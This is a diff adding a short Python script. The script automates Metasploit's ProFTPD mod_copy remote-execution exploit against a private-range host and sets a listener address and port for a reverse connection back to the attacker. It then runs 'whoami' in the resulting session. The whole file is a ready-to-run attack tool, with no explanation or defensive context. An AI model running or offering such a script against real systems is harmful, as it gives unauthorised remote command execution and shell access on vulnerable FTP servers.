@@ -1,0 +1,22 @@
+import subprocess
+
+TARGET = "10.0.2.15"  
+LHOST  = "10.0.2.8"   
+LPORT  = "4444"       
+
+msf_commands = [
+    "use exploit/unix/ftp/proftpd_modcopy_exec",
+    f"set RHOSTS {TARGET}",
+    "set TMPPATH /tmp",
+    "set SITEPATH /var/www/html",
+    "set AutoVerifySession false",
+    "set AllowNoCleanup true",
+    f"set LHOST {LHOST}",
+    f"set LPORT {LPORT}",
+    "exploit",
+    "sessions -i 1 -c whoami",
+    "exit"
+]
+cmd = ["msfconsole", "-q", "-x", "; ".join(msf_commands)]
+
+subprocess.run(cmd)
